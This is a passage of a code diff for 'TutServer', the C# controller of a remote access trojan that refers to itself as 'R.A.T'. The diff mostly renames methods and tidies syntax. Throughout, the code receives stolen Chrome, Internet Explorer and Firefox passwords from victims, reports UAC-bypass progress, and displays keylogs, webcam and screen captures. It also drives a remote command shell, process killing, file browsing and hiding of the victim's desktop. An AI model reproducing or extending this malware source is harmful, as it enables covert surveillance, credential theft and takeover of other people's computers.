+                            Msgbox("Warning", "No video capture devices present on this target!", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                         }
                     }
 
@@ -2430,7 +2503,7 @@ namespace TutServer //Main Namespace
 
                     if (text == "getpwu") //Client sent error because password fox is not found in the directory
                     {
-                        System.Threading.Thread notify = new System.Threading.Thread(new System.Threading.ThreadStart(pwuNotification)); //Create a notify thread
+                        System.Threading.Thread notify = new System.Threading.Thread(new System.Threading.ThreadStart(PwuNotification)); //Create a notify thread
                         notify.Start(); //Start the thread
                     }
 
@@ -2453,11 +2526,13 @@ namespace TutServer //Main Namespace
                                 String user = src[0]; //Get the username
                                 String password = src[1]; //Get the password
                                 String url = src[2]; //Get the URL
-                                ListViewItem lvi = new ListViewItem(); //Create a new listView item
-                                lvi.Text = url; //Set the url
+                                ListViewItem lvi = new ListViewItem
+                                {
+                                    Text = url //Set the url
+                                }; //Create a new listView item
                                 lvi.SubItems.Add(user); //Set the username
                                 lvi.SubItems.Add(password); //Set the password
-                                lvAddItem(listView6, lvi, 1); //Set the item's group (1 = group Internet Explorer)
+                                LvAddItem(listView6, lvi, 1); //Set the item's group (1 = group Internet Explorer)
                             }
                         }
                     }
@@ -2481,11 +2556,13 @@ namespace TutServer //Main Namespace
                                 String user = src[1]; //Get the username
                                 String password = src[2]; //Get the password
                                 String url = src[0]; //Get the URL
-                                ListViewItem lvi = new ListViewItem(); //Create a new listView item
-                                lvi.Text = url; //Set the URL
+                                ListViewItem lvi = new ListViewItem
+                                {
+                                    Text = url //Set the URL
+                                }; //Create a new listView item
                                 lvi.SubItems.Add(user); //Set the username
                                 lvi.SubItems.Add(password); //Set the password
-                                lvAddItem(listView6, lvi, 0); //Set the item's group (0 = group Google Chrome)
+                                LvAddItem(listView6, lvi, 0); //Set the item's group (0 = group Google Chrome)
                             }
                         }
                     }
@@ -2509,11 +2586,13 @@ namespace TutServer //Main Namespace
                                 String user = src[2]; //Get the username
                                 String password = src[3]; //Get the password
                                 String url = src[1]; //Get the URL
-                                ListViewItem lvi = new ListViewItem(); //Create a new listView item
-                                lvi.Text = url; //Set the URL
+                                ListViewItem lvi = new ListViewItem
+                                {
+                                    Text = url //Set the URL
+                                }; //Create a new listView item
                                 lvi.SubItems.Add(user); //Set the username
                                 lvi.SubItems.Add(password); //Set the password
-                                lvAddItem(listView6, lvi, 2); //Set the item's group (2 = group Firefox)
+                                LvAddItem(listView6, lvi, 2); //Set the item's group (2 = group Firefox)
                             }
                         }
                     }
@@ -2527,9 +2606,11 @@ namespace TutServer //Main Namespace
                         label24.BackColor = Color.Black; //Set the back color to read
                         SetErrorText("Error " + code + "\n" + title + "\n" + message); //Set the error message
                         ShowError(); //Update the UI
-                        Timer t = new Timer(); //Create a new timer
-                        t.Interval = 10000; //Set the timer's frequency to 10 seconds
-                        t.Tick += new EventHandler(dismissUpdate); //Set the tick handler
+                        Timer t = new Timer
+                        {
+                            Interval = 10000 //Set the timer's frequency to 10 seconds
+                        }; //Create a new timer
+                        t.Tick += new EventHandler(DismissUpdate); //Set the tick handler
                         t.Start(); //Start the timer
                         /*if (title == "UAC Bypass")
                         {
@@ -2547,7 +2628,7 @@ namespace TutServer //Main Namespace
                         string message = text.Substring(text.IndexOf('§') + 1); //Get the message body
                         message = message.Substring(message.IndexOf('§') + 1); //Format the message
 
-                        foreach (remotePipe rp in rPipeList) //Gor through the remote pipe list
+                        foreach (RemotePipe rp in rPipeList) //Gor through the remote pipe list
                         {
                             if (rp.pname == serverName) //If the servers match
                             {
@@ -2559,13 +2640,13 @@ namespace TutServer //Main Namespace
 
                     if (text == "uac§a_admin") //Client sent that it's running as admin
                     {
-                        msgbox("Warning", "R.A.T is already running in administrator mode!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
+                        Msgbox("Warning", "R.A.T is already running in administrator mode!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
                     }
 
                     if (text == "uac§f_admin") //Client sent that UAC bypass core files are missing
                     {
                         EnableButton(button20, true); //Enable Auto download
-                        msgbox("Error!", "UAC Bypass Core files not found!\r\nYou can download them by pressing autoload!", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
+                        Msgbox("Error!", "UAC Bypass Core files not found!\r\nYou can download them by pressing autoload!", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
                     }
 
                     if (text.StartsWith("uacload§")) //Client sent auto download progress
@@ -2583,7 +2664,7 @@ namespace TutServer //Main Namespace
                             SetControlText(label36, "0%"); //Reset the label text
                             UpdateProgress(progressBar1, 0); //Reset the progress bar value
                             EnableButton(button20, false); //Disable the auto download button
-                            msgbox("Download Complete!", "Core files downloaded, you may retry bypassing UAC now", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notfiy the user
+                            Msgbox("Download Complete!", "Core files downloaded, you may retry bypassing UAC now", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notfiy the user
                         }
                     }
                 }
@@ -2608,11 +2689,11 @@ namespace TutServer //Main Namespace
         /// Set the image of the remote desktop controls
         /// </summary>
         /// <param name="image">The new frame by the client</param>
-        private void setImage(Bitmap image)
+        private void SetImage(Bitmap image)
         {
             if (InvokeRequired) //If we need to invoke
             {
-                setImageCallback callback = new setImageCallback(setImage); //Create the callback
+                setImageCallback callback = new setImageCallback(SetImage); //Create the callback
                 // if (image != null) this.Invoke(callback, new object[] { image });
                 if (image != null) //If the image is not null
                 {
@@ -2675,11 +2756,11 @@ namespace TutServer //Main Namespace
         /// Update the frame of the webCam display controls
         /// </summary>
         /// <param name="image">The new frame sent by the client</param>
-        private void setWebCam(Bitmap image)
+        private void SetWebCam(Bitmap image)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                setWebCamCallback callback = new setWebCamCallback(setWebCam); //Create a callback
+                setWebCamCallback callback = new setWebCamCallback(SetWebCam); //Create a callback
                 this.Invoke(callback, new object[] { image }); //Invoke
             }
             else
@@ -2714,11 +2795,11 @@ namespace TutServer //Main Namespace
         /// Add a new client to the listView
         /// </summary>
         /// <param name="clientid">The ID of the new client</param>
-        private void addlvClientCallback(String clientid)
+        private void AddlvClientCallback(String clientid)
         {
             if (InvokeRequired) //Check if we need to invoke
             {
-                addlvClient k = new addlvClient(addlvClientCallback); //Create the callback
+                addlvClient k = new addlvClient(AddlvClientCallback); //Create the callback
                 Invoke(k, new object[] { clientid }); //Invoke
             }
             else
@@ -2737,11 +2818,11 @@ namespace TutServer //Main Namespace
         /// Restart the server, if a client disconnected
         /// </summary>
         /// <param name="id">ID of the disconnected client</param>
-        private void restartServer(int id)
+        private void RestartServer(int id)
         {
             if (InvokeRequired) //If we need to invoke
             {
-                restartServerCallback callback = new restartServerCallback(restartServer); //Create the callback
+                restartServerCallback callback = new restartServerCallback(RestartServer); //Create the callback
                 Invoke(callback, new object[] { id }); //Invoke
             }
             else
@@ -2751,9 +2832,11 @@ namespace TutServer //Main Namespace
                 label24.ForeColor = Color.Red; //Change the live update text color to red
                 label24.Text = "Client " + id.ToString() + " Disconnected\nOther Sessions restored!"; //Set the live update notification
                 label24.Show(); //Show the live update
-                Timer t = new Timer(); //Create a new timer
-                t.Interval = 5000; //Set the frequency to 5 seconds
-                t.Tick += new EventHandler(dismissUpdate); //Set the tick event handler
+                Timer t = new Timer
+                {
+                    Interval = 5000 //Set the frequency to 5 seconds
+                }; //Create a new timer
+                t.Tick += new EventHandler(DismissUpdate); //Set the tick event handler
                 t.Start(); //Start the timer
             }
         }
@@ -2832,13 +2915,13 @@ namespace TutServer //Main Namespace
         /// Delegate used to close a remote pipe
         /// </summary>
         /// <param name="rp">The remote pipe to close</param>
-        private delegate void ClosePipeCallback(remotePipe rp);
+        private delegate void ClosePipeCallback(RemotePipe rp);
 
         /// <summary>
         /// Close a remote pipe
         /// </summary>
         /// <param name="rp">The remote pipe to close</param>
-        private void ClosePipe(remotePipe rp)
+        private void ClosePipe(RemotePipe rp)
         {
             if (InvokeRequired) //If we need to invoke
             {
@@ -2887,7 +2970,7 @@ namespace TutServer //Main Namespace
             {
                 //Handle Linux Clients
                 Console.WriteLine("Linux Client detected!"); //Debug Function
-                int socketID = getSocket(obj.s); //Get the client ID of the socket
+                int socketID = GetSocket(obj.s); //Get the client ID of the socket
                 if (lcm != null) //If linux client manager is enabled
                 {
                     lcm.AddAssociation(socketID); //Add the client to the manager
@@ -2967,11 +3050,11 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Create a password recovery fail notification
         /// </summary>
-        private void pwuNotification()
+        private void PwuNotification()
         {
             System.Threading.Thread.Sleep(3000); //Wait for 3 seconds
             //msgbox("Try Again!", "PasswordFox.exe is not downloaded please wait 5 seconds and try again\nDownload in progress!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-            msgbox("Error!", "ff.exe (PasswordFox.exe) is not present on the target directory!", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
+            Msgbox("Error!", "ff.exe (PasswordFox.exe) is not present on the target directory!", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
         }
 
         /// <summary>
@@ -2988,11 +3071,11 @@ namespace TutServer //Main Namespace
         /// <param name="lv">The listView to add the item to</param>
         /// <param name="lvi">The item to add</param>
         /// <param name="group">The group to add the item to</param>
-        private void lvAddItem(ListView lv, ListViewItem lvi, int group = -1)
+        private void LvAddItem(ListView lv, ListViewItem lvi, int group = -1)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                lvAddItemCallback callback = new lvAddItemCallback(lvAddItem); //Create a new callback
+                lvAddItemCallback callback = new lvAddItemCallback(LvAddItem); //Create a new callback
                 this.Invoke(callback, new object[] { lv, lvi, group }); //Invoke the callback
             }
             else
@@ -3017,17 +3100,19 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="id">The ID of the device</param>
         /// <param name="name">The name of the device</param>
-        private void addCam(String id, String name)
+        private void AddCam(String id, String name)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                addCamCallback callback = new addCamCallback(addCam); //Create a callback
+                addCamCallback callback = new addCamCallback(AddCam); //Create a callback
                 this.Invoke(callback, new object[] { id, name }); //Invoke the callback
             }
             else
             {
-                ListViewItem lvi = new ListViewItem(); //Create a new item
-                lvi.Text = id; //Set the device ID
+                ListViewItem lvi = new ListViewItem
+                {
+                    Text = id //Set the device ID
+                }; //Create a new item
                 lvi.SubItems.Add(name); //Set the device name
                 listView5.Items.Add(lvi); //Add the item to the listView
             }
@@ -3045,11 +3130,11 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="name">The name of the device</param>
         /// <param name="ch">The channel of the device</param>
-        private void addAudio(String name, String ch)
+        private void AddAudio(String name, String ch)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                addAudioCallback callback = new addAudioCallback(addAudio); //Create a callback
+                addAudioCallback callback = new addAudioCallback(AddAudio); //Create a callback
                 this.Invoke(callback, new object[] { name, ch }); //Invoke the callback
             }
             else
@@ -3071,11 +3156,11 @@ namespace TutServer //Main Namespace
         /// Switch the active tab page
         /// </summary>
         /// <param name="tab">The tab page to switch to</param>
-        public void switchTab(TabPage tab)
+        public void SwitchTab(TabPage tab)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                switchTabC callback = new switchTabC(switchTab); //Create a callback
+                switchTabC callback = new switchTabC(SwitchTab); //Create a callback
                 this.Invoke(callback, new object[] { tab }); //Invoke the callback
             }
             else
@@ -3094,11 +3179,11 @@ namespace TutServer //Main Namespace
         /// Set the keylog text
         /// </summary>
         /// <param name="dump">The keylog to display</param>
-        private void setLog(String dump)
+        private void SetLog(String dump)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                setLogCallback callback = new setLogCallback(setLog); //Create a callback
+                setLogCallback callback = new setLogCallback(SetLog); //Create a callback
                 this.Invoke(callback, new object[] { dump }); //Invoke the callback
             }
             else
@@ -3117,11 +3202,11 @@ namespace TutServer //Main Namespace
         /// Clear the items of a listView
         /// </summary>
         /// <param name="lv">The listView control to clear</param>
-        private void lvClear(ListView lv)
+        private void LvClear(ListView lv)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                lvClearCallback callback = new lvClearCallback(lvClear); //Create a callback
+                lvClearCallback callback = new lvClearCallback(LvClear); //Create a callback
                 this.Invoke(callback, new object[] { lv }); //Invoke the callback
             }
             else
@@ -3140,17 +3225,17 @@ namespace TutServer //Main Namespace
         /// Update the directory listing
         /// </summary>
         /// <param name="directory">The directory to list</param>
-        private void parent(String directory)
+        private void GetParentDirectory(String directory)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                parentCallback callback = new parentCallback(parent); //Create a callback
+                parentCallback callback = new parentCallback(GetParentDirectory); //Create a callback
                 this.Invoke(callback, new object[] { directory }); //Invoke the callback
             }
             else
             {
                 String command = "fdir§" + directory; //Construct the command
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
                 Current_Path = directory; //Set the current path
                 listView3.Items.Clear(); //Clear the items of the file list
             }
@@ -3174,11 +3259,11 @@ namespace TutServer //Main Namespace
         /// <param name="button">Message box buttons</param>
         /// <param name="icon">Message box icon</param>
         /// <returns>The dialog result of the message box</returns>
-        private DialogResult msgbox(String title, String text, MessageBoxButtons button, MessageBoxIcon icon)
+        private DialogResult Msgbox(String title, String text, MessageBoxButtons button, MessageBoxIcon icon)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                msgboxCallback callback = new msgboxCallback(msgbox); //Create a callback
+                msgboxCallback callback = new msgboxCallback(Msgbox); //Create a callback
                 return (DialogResult)this.Invoke(callback, new object[] { title, text, button, icon }); //Invoke and return
             }
             else
@@ -3199,11 +3284,11 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="content">The content to edit</param>
         /// <param name="parent">Reference to the main form</param>
-        private void startEditor(String content, Form1 parent)
+        private void StartEditor(String content, Form1 parent)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                startEditorCallback callback = new startEditorCallback(startEditor); //Create a callback
+                startEditorCallback callback = new startEditorCallback(StartEditor); //Create a callback
                 this.Invoke(callback, new object[] { content, parent }); //Invoke the callback
             }
             else
@@ -3218,7 +3303,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="byt">The byte size of the file</param>
         /// <returns>The highest possible measurement of the size</returns>
-        private String convert(String byt)
+        private String Convert(String byt)
         {
             String stackName = "B"; //Declare the measurement id
             //Console.WriteLine(byt);
@@ -3284,17 +3369,19 @@ namespace TutServer //Main Namespace
         /// <param name="size">The size of the entry</param>
         /// <param name="crtime">The creation time of the entry</param>
         /// <param name="path">The full path of the entry</param>
-        private void addFileCallback(String name, String size, String crtime, String path)
+        private void AddFileCallback(String name, String size, String crtime, String path)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                addFile callback = new addFile(addFileCallback); //Create a callback
+                addFile callback = new addFile(AddFileCallback); //Create a callback
                 this.Invoke(callback, new object[] { name, size, crtime, path }); //Invoke the callback
             }
             else
             {
-                ListViewItem lvi = new ListViewItem(); //Create a new listView item
-                lvi.Text = name; //Set the entry name
+                ListViewItem lvi = new ListViewItem
+                {
+                    Text = name //Set the entry name
+                }; //Create a new listView item
                 lvi.SubItems.Add(size); //Set the entry size
                 lvi.SubItems.Add(crtime); //Set the entry creation time
                 lvi.SubItems.Add(path); //Set the entry full path
@@ -3313,11 +3400,11 @@ namespace TutServer //Main Namespace
         /// Append command line output to the Remote Cmd view
         /// </summary>
         /// <param name="text">The text to append to the output</param>
-        private void append(String text)
+        private void Append(String text)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                appendText callback = new appendText(append); //Create a new callback
+                appendText callback = new appendText(Append); //Create a new callback
                 this.Invoke(callback, new object[] { text }); //Invoke the callback
             }
             else
@@ -3346,17 +3433,19 @@ namespace TutServer //Main Namespace
         /// <param name="priority">The priorty of the process</param>
         /// <param name="path">The full path of the executed file</param>
         /// <param name="id">The PID</param>
-        private void setprocInfoCallback(String name, String responding, String title, String priority, String path, String id)
+        private void SetprocInfoCallback(String name, String responding, String title, String priority, String path, String id)
         {
             if (this.InvokeRequired) //If we need to invoke
             {
-                setProcInfo callback = new setProcInfo(setprocInfoCallback); //Create a new callback
+                setProcInfo callback = new setProcInfo(SetprocInfoCallback); //Create a new callback
                 this.Invoke(callback, new object[] { name, responding, title, priority, path, id }); //Invoke the callback
             }
             else
             {
-                ListViewItem lvi = new ListViewItem(); //Create a new listView item
-                lvi.Text = name; //Set the process name
+                ListViewItem lvi = new ListViewItem
+                {
+                    Text = name //Set the process name
+                }; //Create a new listView item
                 lvi.SubItems.Add(id); //Set the PID
                 lvi.SubItems.Add(responding); //Set the response state
                 lvi.SubItems.Add(title); //Set the main window's title
@@ -3386,11 +3475,11 @@ namespace TutServer //Main Namespace
         /// <param name="time">The time of the client's machine</param>
         /// <param name="av">The anti virus product of the client's machine</param>
         /// <param name="id">The ID of the client</param>
-        private void setlvClientInfoCallback(String name, String ip, String time, String av, int id)
+        private void SetlvClientInfoCallback(String name, String ip, String time, String av, int id)
         {
             if (this.InvokeRequired) //if we need to invoke
             {
-                setlvClientInfo k = new setlvClientInfo(setlvClientInfoCallback); //Create a new callback
+                setlvClientInfo k = new setlvClientInfo(SetlvClientInfoCallback); //Create a new callback
                 this.Invoke(k, new object[] { name, ip, time, av, id }); //Invoke the callback
             }
             else
@@ -3413,11 +3502,11 @@ namespace TutServer //Main Namespace
         /// Set the screen count of the remote client
         /// </summary>
         /// <param name="screenCount">The screen count to set</param>
-        private void setClientScreenCountCallBack(char screenCount)
+        private void SetClientScreenCountCallBack(char screenCount)
         {
             if (InvokeRequired) //If we need to invoke
             {
-                setScreenCount callBack = new setScreenCount(setClientScreenCountCallBack); //Create new callback
+                setScreenCount callBack = new setScreenCount(SetClientScreenCountCallBack); //Create new callback
                 Invoke(callBack, new object[] { screenCount }); //Invoke the callback
             }
             else
@@ -3431,11 +3520,38 @@ namespace TutServer //Main Namespace
         #region Route Window Function
 
         /// <summary>
+        /// Event handler for handling a removed tool strip item with route window
+        /// </summary>
+        /// <param name="sender">The sender of the event</param>
+        /// <param name="e">The event args</param>
+        private void TSItemRemoved(object sender, ToolStripItemEventArgs e)
+        {
+            System.Threading.Monitor.Enter(TSLockObject);
+            tsitem.Remove(e.Item);
+            int tsIndex = tsitem.FindIndex((x) => { if (x == e.Item) return true; else return false; });
+            tsrefname.RemoveAt(tsIndex);
+            System.Threading.Monitor.Exit(TSLockObject);
+        }
+
+        /// <summary>
+        /// Event handler for handling a removed tool strip item with route window
+        /// </summary>
+        /// <param name="sender">The sender of the event</param>
+        /// <param name="e">The event args</param>
+        private void TSItemAdded(object sender, ToolStripItemEventArgs e)
+        {
+            System.Threading.Monitor.Enter(TSLockObject);
+            tsitem.Add(e.Item);
+            tsrefname.Add(e.Item.Name);
+            System.Threading.Monitor.Exit(TSLockObject);
+        }
+
+        /// <summary>
         /// Control value update from routed windows
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void updateValues(object sender, EventArgs e)
+        private void UpdateValues(object sender, EventArgs e)
         {
             if (setvalue.Count != 0) //If we need to set values
             {
@@ -3608,8 +3724,9 @@ namespace TutServer //Main Namespace
         /// Execute a tool stirp item
         /// </summary>
         /// <param name="name">The name of the item to execute</param>
-        public void executeToolStrip(String name)
+        public void ExecuteToolStrip(String name)
         {
+            System.Threading.Monitor.Enter(TSLockObject);
             int track = 0; //Declare index variable
 
             foreach (String refname in tsrefname) //Go through every tool strip item
@@ -3623,6 +3740,8 @@ namespace TutServer //Main Namespace
                 //track++; //Increment the index
                 break; //Break the loop
             }
+
+            System.Threading.Monitor.Exit(TSLockObject);
         }
 
         /// <summary>
@@ -3630,7 +3749,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="name">The name of the control to get the value of</param>
         /// <returns>The value of the control</returns>
-        public static String getValue(String name)
+        public static String GetValue(String name)
         {
             String val = ""; //Declare the value
             foreach (String entry in getvalue) //Loop through every stored control
@@ -3651,7 +3770,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="name">The name of the control to get the selected index of</param>
         /// <returns>The selected index of the control</returns>
-        public int getSelectedIndex(String name)
+        public int GetSelectedIndex(String name)
         {
             int val = 0; //Declare the value
             foreach (String entry in getvalue) //Go through ech stored control
@@ -3671,7 +3790,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="name">The name of the control to get the selected item of</param>
         /// <returns>The selected item of the control</returns>
-        public String getSelectedItem(String name)
+        public String GetSelectedItem(String name)
         {
             String val = ""; //Declare the value
             foreach (String entry in getvalue) //Loop through every stored control
@@ -3691,7 +3810,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="name">The name of the control to get the checked stated of</param>
         /// <returns>The checked stated of the control</returns>
-        public bool getChecked(String name)
+        public bool GetChecked(String name)
         {
             bool val = false; //Declare checked state
             String ret = ""; //Declare the value
@@ -3724,7 +3843,7 @@ namespace TutServer //Main Namespace
         /// <param name="name">The name of the control</param>
         /// <param name="mode">The mode of getting the item</param>
         /// <returns>The items based on the requested mode</returns>
-        public String[] getItems(String name, String mode)
+        public String[] GetItems(String name, String mode)
         {
             List<String> ret = new List<String>(); //Declare a list for results
             Control lvc = Controls.Find(name, true)[0]; //Find the listView control
@@ -3779,7 +3898,7 @@ namespace TutServer //Main Namespace
             {
                 ContextMenuStrip cms = new ContextMenuStrip(); //Create a new context menu strip
                 cms.Items.Add("Route Window"); //Add the items route window
-                cms.Items[0].Click += new EventHandler(rwind); //Assign a click handler
+                cms.Items[0].Click += new EventHandler(RWind); //Assign a click handler
                 cms.Show(Cursor.Position); //Show the context menu strip
             }
         }
@@ -3789,12 +3908,14 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void rwind(object sender, EventArgs e)
+        private void RWind(object sender, EventArgs e)
         {
             TabPage srcRoute = tabControl1.SelectedTab; //Get the route source
-            routeWindow rw = new routeWindow(); //Declare a new route window
-            rw.page = srcRoute; //Set the page to the route source
-            rw.routePage(); //Route the page
+            RouteWindow rw = new RouteWindow
+            {
+                page = srcRoute //Set the page to the route source
+            }; //Declare a new route window
+            rw.RoutePage(); //Route the page
         }
 
         #endregion
@@ -3831,7 +3952,7 @@ namespace TutServer //Main Namespace
 
                     foreach (Socket client in _clientSockets) //Go through the connected sockets
                     {
-                        sendCommand("getinfo-" + id.ToString(), id); //Resend getinfo -> to change the client IDs
+                        SendCommand("getinfo-" + id.ToString(), id); //Resend getinfo -> to change the client IDs
                         id++; //Increment the index
                         //MessageBox.Show("getinfo-" + id.ToString());
                     }
@@ -3859,17 +3980,9 @@ namespace TutServer //Main Namespace
         {
             if (listView1.SelectedItems.Count > 0) //If an item is selected
             {
-                List<int> clients = new List<int>(); //Declare a list for IDs
-
-                foreach (ListViewItem lvi in listView1.SelectedItems) //Loop through the items
-                {
-                    int id = int.Parse(lvi.SubItems[0].Text.Replace("Client ", "")); //Get the id of the client
-                    clients.Add(id); //Add it to the control list
-                }
-
-                controlClients = clients.ToArray(); //Convert the list to array
-                sCore.RAT.ServerSettings.currentClient = controlClients[0]; //Set the current client's ID for plugins
-                sendCommand("getstart", clients[0]); //Get the application startup directory
+                controlClient = int.Parse(listView1.SelectedItems[0].SubItems[0].Text.Replace("Client ", string.Empty));
+                sCore.RAT.ServerSettings.SetCurrentClient(hostToken, controlClient); //Set the current client's ID for plugins
+                SendCommand("getstart", controlClient); //Get the application startup directory
             }
         }
 
@@ -3938,7 +4051,7 @@ namespace TutServer //Main Namespace
             //Construct data
 
             String cmd = "msg|" + title + "|" + text + "|" + ico + "|" + btn; //Construct the command
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -3949,7 +4062,7 @@ namespace TutServer //Main Namespace
         private void button4_Click(object sender, EventArgs e)
         {
             String cmd = "freq-" + textBox3.Text; //Construct the command
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -3982,7 +4095,7 @@ namespace TutServer //Main Namespace
             }
 
             String cmd = "sound-" + code; //Construct the command
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -3995,7 +4108,7 @@ namespace TutServer //Main Namespace
             String text = richTextBox1.Text; //Get the text to read
             String cmd = "t2s|" + text; //Construct the command
 
-            loopSend(cmd); //Send to command to the client
+            SendToTarget(cmd); //Send to command to the client
         }
 
         /// <summary>
@@ -4007,7 +4120,7 @@ namespace TutServer //Main Namespace
         {
             String cmd = "cd|open"; //Construct the command
 
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -4019,7 +4132,7 @@ namespace TutServer //Main Namespace
         {
             String cmd = "cd|close"; //Construct the command
 
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -4043,7 +4156,7 @@ namespace TutServer //Main Namespace
                 c.Text = "Clock: Visible"; //Update the button
             }
 
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -4067,7 +4180,7 @@ namespace TutServer //Main Namespace
                 c.Text = "Task Bar: Visible"; //Update the button
             }
 
-            loopSend(cmd); //Send command to the client
+            SendToTarget(cmd); //Send command to the client
         }
 
         /// <summary>
@@ -4091,7 +4204,7 @@ namespace TutServer //Main Namespace
                 c.Text = "Desktop Icons: Visible"; //Update the button text
             }
 
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -4115,7 +4228,7 @@ namespace TutServer //Main Namespace
                 c.Text = "Tray Icons: Visible"; //Update the button
             }
 
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -4139,7 +4252,7 @@ namespace TutServer //Main Namespace
                 c.Text = "Start Menu: Visible"; //Update the button
             }
 
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -4151,7 +4264,7 @@ namespace TutServer //Main Namespace
         {
             String cmd = "proclist"; //Construct the command
             listView2.Items.Clear(); //Clear the process list
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -4166,11 +4279,11 @@ namespace TutServer //Main Namespace
                 String id = listView2.SelectedItems[0].SubItems[1].Text; //get the process id
                 String cmd = "prockill|" + id; //Construct the command
 
-                loopSend(cmd); //Send the command to the client
+                SendToTarget(cmd); //Send the command to the client
 
                 System.Threading.Thread.Sleep(1000); //Wait for the client to kill the process
                 listView2.Items.Clear(); //Clear the process list
-                loopSend("proclist"); //List the processes
+                SendToTarget("proclist"); //List the processes
             }
         }
 
@@ -4185,11 +4298,11 @@ namespace TutServer //Main Namespace
             {
                 String cmd = "procstart|" + textBox4.Text + "|" + comboBox4.SelectedItem.ToString(); //Construct the command
 
-                loopSend(cmd); //Send the command to the client
+                SendToTarget(cmd); //Send the command to the client
                 textBox4.Clear(); //Clear the process name box
                 System.Threading.Thread.Sleep(1000); //Wait for the client to start the process
                 listView2.Items.Clear(); //Clear the process list
-                loopSend("proclist"); //List the processes
+                SendToTarget("proclist"); //List the processes
             }
         }
 
@@ -4203,14 +4316,14 @@ namespace TutServer //Main Namespace
             if (!IsCmdStarted) //If it's stopped
             {
                 String command = "startcmd"; //Construct the command
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
                 IsCmdStarted = true; //Set the cmd started flag
                 button15.Text = "Stop Cmd"; //Update the button
             }
             else
             {
                 String command = "stopcmd"; //Construct the command
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
                 IsCmdStarted = false; //Set the cmd started flag to false
                 button15.Text = "Start Cmd"; //Update the button
             }
@@ -4239,7 +4352,7 @@ namespace TutServer //Main Namespace
                     DialogResult result = MessageBox.Show(this, "Do you want to exit from the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
                     if (result == DialogResult.Yes) //Stop the remote cmd
                     {
-                        loopSend("stopcmd"); //Send command to the client
+                        SendToTarget("stopcmd"); //Send command to the client
                         button15.Text = "Start Cmd"; //Update button
                         IsCmdStarted = false; //Set the cmd started flag to false
                         return; //Return
@@ -4249,7 +4362,7 @@ namespace TutServer //Main Namespace
                         return; //Return;
                     }
                 }
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
             }
             else if (e.KeyCode == Keys.Return && !IsCmdStarted) //If eneter is pressed and remote cmd is not started
             {
@@ -4265,7 +4378,7 @@ namespace TutServer //Main Namespace
         private void listDrivesToolStripMenuItem_Click(object sender, EventArgs e)
         {
             String command = "fdrive"; //Construct the command
-            loopSend(command); //Send the command to the client
+            SendToTarget(command); //Send the command to the client
         }
 
         /// <summary>
@@ -4285,7 +4398,7 @@ namespace TutServer //Main Namespace
                 }
                 String fullPath = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the directory or drive
                 String command = "fdir§" + fullPath; //Construct the command
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
                 Current_Path = fullPath; //Set the current path
                 listView3.Items.Clear(); //Clear the file list
             }
@@ -4308,7 +4421,7 @@ namespace TutServer //Main Namespace
                 return; //Return
             }
             String cmd = "f1§" + Current_Path; //Construct the command
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -4349,8 +4462,8 @@ namespace TutServer //Main Namespace
